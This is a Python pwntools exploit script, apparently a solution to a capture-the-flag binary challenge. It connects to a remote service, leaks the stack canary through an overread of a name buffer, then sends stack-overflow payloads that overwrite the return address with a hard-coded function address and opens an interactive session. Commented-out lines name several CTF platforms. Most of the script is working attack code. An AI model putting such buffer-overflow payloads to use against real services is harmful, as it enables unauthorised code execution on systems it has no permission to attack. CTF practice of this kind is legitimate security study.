import time
from pwn import *
from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 27334)


# io = remote("node5.anna.nssctf.cn", 28604)
# io = remote("112.6.51.212", 30946)
# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./alloc')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

back = 0x4012BB

ru("name:")
# sl(b"a")
s(b'a' * (0x20 - 8) + b'b')
ru(b'aaab')
canary = u64(io.recv(7).rjust(8, b'\x00'))
canary = canary
print(hex(canary))

ru("leave")
sl(b'3')
sl(b'a' * (0xa0) + b'd' * 8 + p64(0x4012BF))
sl(b'c' * (0xa0 - 32 - 8) + p64(canary + 0x11))
sl(b'd' * (0xa0 - 32 * 2 - 8) + p64(canary))

inter()
